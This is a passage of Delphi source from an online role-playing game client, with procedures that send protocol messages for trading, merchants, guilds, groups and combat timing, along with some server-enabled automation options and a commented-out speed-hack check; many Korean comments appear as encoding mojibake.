    SendSocket(EncodeMessage(msg));
    ActionLock := TRUE;
    //辑滚俊辑 #+FAIL! 捞唱 #+GOOD!捞 棵锭鳖瘤 扁促覆
    ActionLockTime := GetTickCount;
    Inc(g_nSendCount);
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSpellMsg'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendQueryUserName(targetid, x, y: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_QUERYUSERNAME, targetid, x, y, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendQueryUserName'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendDropItem(name: String; itemserverindex: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DROPITEM, itemserverindex, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(name));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendDropItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendPickup;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_PICKUP, 0, g_MySelf.m_nCurrX, g_MySelf.m_nCurrY,
      0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendPickup'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendTakeOnItem(where: byte; itmindex: integer; itmname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_TAKEONITEM, itmindex, where, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itmname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendTakeOnItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendTakeOffItem(where: byte; itmindex: integer; itmname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_TAKEOFFITEM, itmindex, where, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itmname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendTakeOffItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendEat(itmindex: integer; itmname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_EAT, itmindex, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itmname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendEat'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendButchAnimal(x, y, dir, actorid: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_BUTCH, actorid, x, y, dir);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendButchAnimal'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendMagicKeyChange(magid: integer; keych: char; bohero:
  Boolean = false);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_MAGICKEYCHANGE, magid, byte(keych),
      Integer(bohero), 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendMagicKeyChange'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendPlayDrinkSend(Npc, Idx, Count: integer);
Var
  msg: TDefaultMessage;
  I: integer;
Begin
  If Idx = 0 Then
    FrmDlg.DDrink1.Visible := False;
  If Idx = 1 Then
    FrmDlg.DDrink2.Visible := False;
  If Idx = 2 Then
    FrmDlg.DDrink3.Visible := False;
  If Idx = 3 Then
    FrmDlg.DDrink4.Visible := False;
  If Idx = 4 Then
    FrmDlg.DDrink5.Visible := False;
  If Idx = 5 Then
    FrmDlg.DDrink6.Visible := False;
  For i := 0 To FrmDlg.m_CompeteDrinkIdxList.Count - 1 Do
  Begin
    If Integer(FrmDlg.m_CompeteDrinkIdxList.Items[I]) = Idx Then
    Begin
      FrmDlg.m_CompeteDrinkIdxList.Delete(I);
      break;
    End;
  End;
  FrmDlg.m_CompeteDrinkType := pdDD;
  msg := MakeDefaultMsg(CM_PLAYDRINKSEND, Npc, Idx, Count, 0);
  SendSocket(EncodeMessage(msg));
End;

Procedure TfrmMain.SendPlayDrinkGame(Npc, Idx: integer);
Var
  msg: TDefaultMessage;
Begin
  msg := MakeDefaultMsg(CM_PLAYDRINKGAME, Npc, Idx, 0, 0);
  SendSocket(EncodeMessage(msg));
End;

Procedure TfrmMain.SendMerchantDlgSelect(merchant: integer; rstr: String);
Var
  msg: TDefaultMessage;
  param: String;
Begin
  Try //程序自动增加
    If Length(rstr) >= 2 Then
    Begin //颇扼皋鸥啊 鞘夸茄 版快啊 乐澜.
      If (rstr[1] = '@') And (rstr[2] = '@') Then
      Begin
        If rstr = '@@buildguildnow' Then
          FrmDlg.DMessageDlg('请输入你想建立的行会的名字。',
            [mbOk, mbAbort])
        Else
          FrmDlg.DMessageDlg('请输入。', [mbOk, mbAbort]);
        param := Trim(FrmDlg.DlgEditText);
        rstr := rstr + #13 + param;
      End;
    End;
    msg := MakeDefaultMsg(CM_MERCHANTDLGSELECT, merchant, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(rstr));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendMerchantDlgSelect');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendQueryPrice(merchant, itemindex: integer; itemname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_MERCHANTQUERYSELLPRICE, merchant,
      Loword(itemindex), Hiword(itemindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendQueryPrice'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendQueryRepairCost(merchant, itemindex: integer; itemname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_MERCHANTQUERYREPAIRCOST, merchant,
      Loword(itemindex), Hiword(itemindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendQueryRepairCost'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSellItem(merchant, itemindex: integer; itemname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERSELLITEM, merchant, Loword(itemindex),
      Hiword(itemindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSellItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendRepairItem(merchant, itemindex: integer; itemname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERREPAIRITEM, merchant, Loword(itemindex),
      Hiword(itemindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendRepairItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendStorageItem(merchant, itemindex: integer; itemname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERSTORAGEITEM, merchant, Loword(itemindex),
      Hiword(itemindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendStorageItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSellOffItem(merchant, itemindex, ItemPic: integer;
  boFlag: Boolean);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_SELLOFFITEM, merchant, Loword(itemindex),
      Hiword(itemindex), Integer(boFlag));
    SendSocket(EncodeMessage(msg) + EncodeString(IntToStr(ItemPic)));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSellOffItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendPlayDrinkItem(merchant, itemindex: Integer);
Var
  msg: TDefaultMessage;
Begin
  msg := MakeDefaultMsg(CM_PLAYDRINKSELL, merchant, Loword(itemindex),
    Hiword(itemindex), 0);
  SendSocket(EncodeMessage(msg));
End;

Procedure TfrmMain.SendGetDetailItem(merchant, menuindex: integer; itemname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERGETDETAILITEM, merchant, menuindex, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGetDetailItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendBuyItem(merchant, itemserverindex: integer; itemname:
  String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERBUYITEM, merchant, Loword(itemserverindex),
      Hiword(itemserverindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendBuyItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendTakeBackStorageItem(merchant, itemserverindex: integer;
  itemname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERTAKEBACKSTORAGEITEM, merchant,
      Loword(itemserverindex), Hiword(itemserverindex), 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendTakeBackStorageItem');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendMakeDrugItem(merchant: integer; itemname: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_USERMAKEDRUGITEM, merchant, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(itemname));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendMakeDrugItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendDropGold(dropgold: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DROPGOLD, dropgold, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendDropGold'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGroupMode(onoff: Boolean);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If onoff Then
      msg := MakeDefaultMsg(CM_GROUPMODE, 0, 1, 0, 0) //on
    Else
      msg := MakeDefaultMsg(CM_GROUPMODE, 0, 0, 0, 0); //off
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGroupMode'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendAutoAddGroup(sName: String);
Var
  msg: TDefaultMessage;
Begin
  msg := MakeDefaultMsg(CM_AUTOADDGROUP, 0, 0, 0, 0);
  SendSocket(EncodeMessage(msg) + EncodeString(sName));
End;

Procedure TfrmMain.SendAutoGroup(boAuto: Boolean);
Var
  msg: TDefaultMessage;
Begin
  msg := MakeDefaultMsg(CM_AUTOGROUP, Integer(boAuto), 0, 0, 0);
  SendSocket(EncodeMessage(msg));
End;

Procedure TfrmMain.SendCreateGroup(withwho: String; boAuto: Boolean);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If withwho <> '' Then
    Begin
      msg := MakeDefaultMsg(CM_CREATEGROUP, Integer(boAuto), 0, 0, 0);
      SendSocket(EncodeMessage(msg) + EncodeString(withwho));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendCreateGroup'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendWantMiniMap;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_WANTMINIMAP, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendWantMiniMap'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendDealTry;
Var
  msg: TDefaultMessage;
  //   i, fx, fy: integer;
  //   actor: TActor;
  who: String;
  //   proper: Boolean;
Begin
  Try //程序自动增加
    (*proper := FALSE;
    GetFrontPosition (Myself.XX, Myself.m_nCurrY, Myself.Dir, fx, fy);
    with PlayScene do
       for i:=0 to ActorList.Count-1 do begin
          actor := TActor (ActorList[i]);
          if {(actor.m_btRace = 0) and} (actor.XX = fx) and (actor.m_nCurrY = fy) then begin
             proper := TRUE;
             who := actor.UserName;
             break;
          end;
       end;
    if proper then begin*)
    msg := MakeDefaultMsg(CM_DEALTRY, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(who));
    //end;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendDealTry'); //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.SendChallengeTry;
Var
  msg: TDefaultMessage;
begin
  try
    msg := MakeDefaultMsg(CM_ChallengeTRY, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  except
    DebugOutStr('[Exception]  TfrmMain.SendChallengeTry');
  end;  
end;
Procedure TfrmMain.SendGuildDlg;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_OPENGUILDDLG, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildDlg'); //程序自动增加
  End; //程序自动增加
End;

procedure TfrmMain.SendCancelChallege;
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_CancelChallege, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendCancelChallege');
  End;

end;

Procedure TfrmMain.SendCancelDeal;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DEALCANCEL, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendCancelDeal'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendAddDealItem(ci: TClientItem);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DEALADDITEM, ci.MakeIndex, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(ci.S.Name));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendAddDealItem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendDelDealItem(ci: TClientItem);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DEALDELITEM, ci.MakeIndex, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(ci.S.Name));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendDelDealItem'); //程序自动增加
  End; //程序自动增加
End;

//添加挑战物品
procedure TfrmMain.SendADDChallengeItem(cl:TClientItem;idx:Word);
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_ChallengeADDItem,cl.MakeIndex,idx, 0, 0);
    SendSocket(EncodeMessage(msg){ + EncodeString(cl.S.Name)});
  Except
    DebugOutStr('[Exception] TfrmMain.SendADDChallengeItem');
  End;
end;

//删除挑战物品
procedure TfrmMain.SendDelChallengeItem(cl: TClientItem; idx: Word);
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_ChallenageDelItem,cl.MakeIndex,idx, 0, 0);
    SendSocket(EncodeMessage(msg){ + EncodeString(cl.S.Name)});
  Except
    DebugOutStr('[Exception]  TfrmMain.SendDelChallengeItem');
  End;
end;

//更改挑战抵押金币
procedure TfrmMain.SendChangeChallengeGold(gold: integer);
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_ChallengeGold, gold, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendChangeChallengeGold');
  End;
End;

//更改挑战抵押金刚石
procedure TfrmMain.SendChangeChallengeGameDiamond(gold: integer);
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_ChallengeGameDiamond, gold, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendChangeChallengeGold');
  End;
end;

Procedure TfrmMain.SendChangeDealGold(gold: integer);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_DEALCHGGOLD, gold, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendChangeDealGold'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendDealEnd;
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_DEALEND, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendDealEnd'); //程序自动增加
  End;
End;

//确认挑战抵押
procedure TfrmMain.SendChallengeEnd;
Var
  msg: TDefaultMessage;
Begin
  Try
    msg := MakeDefaultMsg(CM_ChallengeEnd, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except
    DebugOutStr('[Exception] TfrmMain.SendChallengeEnd');
  End;
End;


Procedure TfrmMain.SendAddGroupMember(withwho: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If withwho <> '' Then
    Begin
      msg := MakeDefaultMsg(CM_ADDGROUPMEMBER, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + EncodeString(withwho));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendAddGroupMember'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendDelGroupMember(withwho: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If withwho <> '' Then
    Begin
      msg := MakeDefaultMsg(CM_DELGROUPMEMBER, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + EncodeString(withwho));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendDelGroupMember'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGuildHome;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_GUILDHOME, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildHome'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGuildMemberList;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_GUILDMEMBERLIST, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildMemberList'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGuildAddMem(who: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If Trim(who) <> '' Then
    Begin
      msg := MakeDefaultMsg(CM_GUILDADDMEMBER, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + EncodeString(who));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildAddMem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGuildDelMem(who: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    If Trim(who) <> '' Then
    Begin
      msg := MakeDefaultMsg(CM_GUILDDELMEMBER, 0, 0, 0, 0);
      SendSocket(EncodeMessage(msg) + EncodeString(who));
    End;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildDelMem'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGuildUpdateNotice(notices: String; nClass: Byte);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_GUILDUPDATENOTICE, nClass, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(notices));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildUpdateNotice');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendGuildUpdateGrade(rankinfo: String);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_GUILDUPDATERANKINFO, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeString(rankinfo));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendGuildUpdateGrade');
    //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendSpeedHackUser;
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_SPEEDHACKUSER, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendSpeedHackUser'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendAdjustBonus(remain: integer; babil: TNakedAbility);
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_ADJUST_BONUS, remain, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeBuffer(@babil,
      sizeof(TNakedAbility)));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendAdjustBonus'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SendPowerBlock();
Var
  msg: TDefaultMessage;
Begin
  Try //程序自动增加
    msg := MakeDefaultMsg(CM_POWERBLOCK, 0, 0, 0, 0);
    SendSocket(EncodeMessage(msg) + EncodeBuffer(@g_PowerBlock,
      sizeof(TPowerBlock)));
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SendPowerBlock'); //程序自动增加
  End; //程序自动增加
End;
{---------------------------------------------------------------}

Function TfrmMain.ServerAcceptNextAction: Boolean;
Begin
  Result := TRUE;
  //捞傈 青悼捞 辑滚俊辑 牢沥登菌绰瘤
  If ActionLock Then
  Begin
    If GetTickCount - ActionLockTime > 10 * 1000 Then
    Begin
      ActionLock := FALSE;
      //Dec (WarningLevel);
    End;
    Result := FALSE;
  End;
End;

Function TfrmMain.CanNextAction: Boolean;
Begin
  If (g_MySelf.IsIdle) And
    ((g_MySelf.m_nState And $04000000 = 0) Or (g_wgInfo.boParalyCan And
    g_ClientWgInfo.boParalyCan)) And //防石化
  (GetTickCount - g_dwDizzyDelayStart > g_dwDizzyDelayTime) Then
  Begin
    Result := TRUE;
  End
  Else
    Result := FALSE;
End;
//是否可以攻击，控制攻击速度

Function TfrmMain.CanNextHit: Boolean;
Var
  NextHitTime, LevelFastTime: Integer;
Begin
  LevelFastTime := _MIN(370, (g_MySelf.m_Abil.Level * 14));
  LevelFastTime := _MIN(800, LevelFastTime + g_MySelf.m_nHitSpeed2 * g_nItemSpeed
    {60});

  If g_boAttackSlow Then
    NextHitTime := g_nHitTime {1400} - LevelFastTime + 1500
    //腕力超过时，减慢攻击速度
  Else
    NextHitTime := g_nHitTime {1400} - LevelFastTime;
  //NextHitTime:=NextHitTime-g_wgInfo.nHitTime*100; //Jason
  If NextHitTime < 0 Then
    NextHitTime := 0;

  If (GetTickCount - LastHitTick) >= LongWord(NextHitTime) Then
  Begin
    LastHitTick := GetTickCount;
    Result := True;
  End
  Else
    Result := False;
End;

Procedure TfrmMain.ActionFailed;
Begin
  Try //程序自动增加
    g_nTargetX := -1;
    g_nTargetY := -1;
    ActionFailLock := TRUE;
    //鞍篮 规氢栏肺 楷加捞悼角菩甫 阜扁困秦辑, FailDir苞 窃膊 荤侩
    ActionFailLockTime := GetTickCount(); //Jacky
    g_MySelf.MoveFail;
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.ActionFailed'); //程序自动增加
  End; //程序自动增加
End;

Function TfrmMain.IsUnLockAction(action, adir: integer): Boolean;
Begin
  If ActionFailLock Then
  Begin //如果操作被锁定，则在指定时间后解锁
    If GetTickCount() - ActionFailLockTime > 1000 Then
      ActionFailLock := False;
  End;
  If (ActionFailLock) Or (g_boMapMoving) Or (g_boServerChanging) Then
  Begin
    Result := FALSE;
  End
  Else
    Result := TRUE;

  {
     if (ActionFailLock and (action = FailAction) and (adir = FailDir))
        or (MapMoving)
        or (BoServerChanging) then begin
        Result := FALSE;
     end else begin
        ActionFailLock := FALSE;
        Result := TRUE;
     end;
  }
End;

Function TfrmMain.IsGroupMember(uname: String): Boolean;
Var
  i: integer;
Begin
  Result := FALSE;
  For i := 0 To g_GroupMembers.Count - 1 Do
    If g_GroupMembers[i] = uname Then
    Begin
      Result := TRUE;
      break;
    End;
End;

{-------------------------------------------------------------}

Procedure TfrmMain.Timer1Timer(Sender: TObject);
Var
  //   str,
  data: String;
  //   len, i, n{, mcnt} : integer;
Const
  busy: Boolean = FALSE;
Begin
  Try //程序自动增加
    If busy Then
      exit;
    //if ServerConnected then
    //   DxTimer.Enabled := TRUE
    //else
    //   DxTimer.Enabled := FALSE;

    busy := TRUE;
    Try
      BufferStr := BufferStr + SocStr;
      SocStr := '';
      If BufferStr <> '' Then
      Begin
        //mcnt := 0;
        While Length(BufferStr) >= 2 Do
        Begin
          If g_boMapMovingWait Then
            break; // 措扁..
          If Pos('!', BufferStr) <= 0 Then
            break;
          BufferStr := ArrestStringEx(BufferStr, '#', '!', data);
          If data = '' Then
            break;

          DecodeMessagePacket(data);

          If Pos('!', BufferStr) <= 0 Then
            break;
        End;
      End;
    Finally
      busy := FALSE;
    End;

    If WarningLevel > 30 Then
      FrmMain.Close;

    If g_boQueryPrice Then
    Begin
      If GetTickCount - g_dwQueryPriceTime > 500 Then
      Begin
        g_boQueryPrice := FALSE;
        Case FrmDlg.SpotDlgMode Of
          dmSell: SendQueryPrice(g_nCurMerchant, g_SellDlgItem2.MakeIndex,
              g_SellDlgItem2.S.Name);
          dmRepair: SendQueryRepairCost(g_nCurMerchant,
              g_SellDlgItem2.MakeIndex, g_SellDlgItem2.S.Name);
        End;
      End;
    End;

    If g_nBonusPoint > 0 Then
    Begin
      FrmDlg.DBotPlusAbil.Visible := TRUE;
    End
    Else
    Begin
      FrmDlg.DBotPlusAbil.Visible := FALSE;
    End;

    //英雄吃药
    Try
      If (g_HeronRecogId <> 0) And
        ((GetTickCount - m_dwHeroEatTick) > g_HeroEatingTime) // And (g_HeroEatingItem.S.Name = '')
         Then
      Begin
        m_dwHeroEatTick := GetTickCount;

        If //(g_HeroEatingItem.S.Name = '') And
        ((g_HeroAbil.HP / g_HeroAbil.maxHP
          * 100) < 90) Then
          GetHeroEatItem(1);
        If //(g_HeroEatingItem.S.Name = '') And
        ((g_HeroAbil.MP / g_HeroAbil.maxMP
          * 100) < 60) Then
          GetHeroEatItem(2);
        //if g_HeroEatingItem.S.Name = '' then GetHeroOpenItem; //自动解包
      End;
    Except
    End;

    //英雄自动自捡取
    Try
      If g_WgInfo.boAutoPuckUpItem And
        g_ClientWgInfo.boAutoPuckUpItem And
        (g_MySelf <> Nil) And
        ((GetTickCount() - g_dwAutoPickupTick) > g_AutoPuckUpItemTime) Then
      Begin

        g_dwAutoPickupTick := GetTickCount();
        AutoPickUpItem();
      End;
    Except
    End;

  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.Timer1Timer'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.SpeedHackTimerTimer(Sender: TObject);
Var
  gcount, timer: longword;
  ahour, amin, asec, amsec: word;
Begin
  Try //程序自动增加

 SetProcessWorkingSetSize(GetCurrentProcess, $FFFFFFFF, $FFFFFFFF);

    {DecodeTime (Time, ahour, amin, asec, amsec);
     timer := ahour * 1000 * 60 * 60 + amin * 1000 * 60 + asec * 1000 + amsec;
     gcount := GetTickCount;
     if g_dwSHGetTime > 0 then begin
        if abs((gcount - g_dwSHGetTime) - (timer - g_dwSHTimerTime)) > 70 then begin
           Inc (g_nSHFakeCount);
        end else
           g_nSHFakeCount := 0;
        if g_nSHFakeCount > 4 then begin
           FrmDlg.DMessageDlg ('Terminate the program. CODE=10001\' +
                               'Please contact game master.',
                               [mbOk]);
           FrmMain.Close;
        end;
        if g_boCheckSpeedHackDisplay then begin
           DScreen.AddSysMsg ('->' + IntToStr(gcount - g_dwSHGetTime) + ' - ' +
                                     IntToStr(timer - g_dwSHTimerTime) + ' = ' +
                                     IntToStr(abs((gcount - g_dwSHGetTime) - (timer - g_dwSHTimerTime))) + ' (' +
                                     IntToStr(g_nSHFakeCount) + ')');
        end;
     end;
     g_dwSHGetTime := gcount;
     g_dwSHTimerTime := timer; }
  Except //程序自动增加
    DebugOutStr('[Exception] TfrmMain.SpeedHackTimerTimer'); //程序自动增加
  End; //程序自动增加
End;

Procedure TfrmMain.CheckSpeedHack(rtime: Longword);
{var
   cltime, svtime: integer;
   str: string; }
Begin
  (*Try //程序自动增加
     if g_dwFirstServerTime > 0 then begin
        if (GetTickCount - g_dwFirstClientTime) > 1 * 60 * 60 * 1000 then begin  //1矫埃 付促 檬扁拳
           g_dwFirstServerTime := rtime; //檬扁拳
